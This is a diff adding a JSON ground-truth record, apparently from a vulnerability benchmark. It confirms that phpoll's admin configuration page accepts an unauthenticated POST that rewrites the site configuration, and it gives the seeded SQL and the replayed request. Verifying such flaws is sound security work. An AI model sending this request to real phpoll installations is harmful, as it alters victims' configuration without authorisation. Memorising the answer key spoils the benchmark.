@@ -1,0 +1,49 @@
+{
+  "gt_id": "GT-007",
+  "app": "phpoll",
+  "verified_at": "2026-09-06T04:57:39.257732+00:00",
+  "verdict": "vulnerable",
+  "summary": "visitor POST to admin/modifica_configurazione.php returned 200; configuration was truncated and rewritten: oggetto_email DRHLGT_cfg_before_8670658713 -> DRHLGT_cfg_after_8670658713 (updated=True); barra*.gif image files were restored afterwards.",
+  "sql_statements": [
+    {
+      "kind": "execute",
+      "sql": "UPDATE phpoll_test_configurazione SET oggetto_email='DRHLGT_cfg_before_8670658713' WHERE id=1"
+    },
+    {
+      "kind": "query",
+      "sql": "SHOW COLUMNS FROM phpoll_test_configurazione"
+    },
+    {
+      "kind": "query",
+      "sql": "SELECT * FROM phpoll_test_configurazione LIMIT 1"
+    },
+    {
+      "kind": "scalar",
+      "sql": "SELECT oggetto_email FROM phpoll_test_configurazione WHERE id=1"
+    },
+    {
+      "kind": "scalar",
+      "sql": "SELECT login FROM phpoll_test_configurazione WHERE id=1"
+    }
+  ],
+  "steps": [
+    {
+      "kind": "instrument",
+      "table": "phpoll_test_configurazione",
+      "row": "id=1",
+      "column": "oggetto_email",
+      "token1": "DRHLGT_cfg_before_8670658713",
+      "token2": "DRHLGT_cfg_after_8670658713"
+    },
+    {
+      "kind": "replay",
+      "role": "visitor (no login)",
+      "request": "POST admin/modifica_configurazione.php oggetto_email=DRHLGT_cfg_after_8670658713",
+      "status_code": 200,
+      "db_oggetto_email_before": "DRHLGT_cfg_before_8670658713",
+      "db_oggetto_email_after": "DRHLGT_cfg_after_8670658713",
+      "db_login_after": "admin",
+      "updated": true
+    }
+  ]
+}
